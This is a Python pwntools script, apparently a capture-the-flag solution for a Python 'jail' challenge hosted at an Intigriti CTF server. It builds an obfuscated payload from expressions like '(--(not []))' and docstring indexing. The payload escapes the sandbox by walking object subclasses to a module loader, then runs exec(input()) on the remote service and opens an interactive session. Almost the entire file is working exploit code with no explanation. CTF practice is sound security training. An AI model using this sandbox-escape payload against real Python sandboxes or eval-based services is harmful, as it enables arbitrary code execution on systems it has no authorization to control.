from pwn import *

one = "(--(not []))"

string = "<method-wrapper '__mul__' of list object at"
str_src = "[].__mul__.__str__()"


def g(i):
	return "(" + "+".join([one] * i) + ")"


m = {
	"10": f"{g(2)}*{g(5)}",
	"17": f"{g(4)}*{g(4)}+{one}",
	"20": f"{g(4)}*{g(5)}",
	"21": f"{g(3)}*{g(7)}",
	"30": f"{g(2)}*{g(3)}*{g(5)}",
}


def gennum(i):
	if str(i) in m:
		return m[str(i)]
	else:
		return g(i)


def genstr(s):
	ret = []
	for i in s:
		if i in string:
			ret.append(f"({str_src})[{gennum(string.index(i))}]")
			print(string.index(i))
		elif i in [].__doc__:
			ret.append(f"[].__doc__[{gennum([].__doc__.index(i))}]")
		elif i in {}.__doc__:
			ret.append(f"{{}}.__doc__[{gennum({}.__doc__.index(i))}]")
		else:
			print(f"genstr: {i}")
	return "+".join(ret)


payload = (
	f"[(__builtins__:=[].__doc__.__class__.__subclasses__.__class__.__bases__[{one} - {one}].__subclasses__()[{gennum(122)}]()"
	f".__getattribute__({genstr("load_module")})({genstr("builtins")})), __builtins__.__getattribute__({genstr("exec")})(__builtins__.__getattribute__({genstr("input")})())]"
)
print(payload)

r = remote("jail.ctf.intigriti.io", 1351)
# r = process("./challenge/chal.py")

r.sendline(payload)
r.interactive()
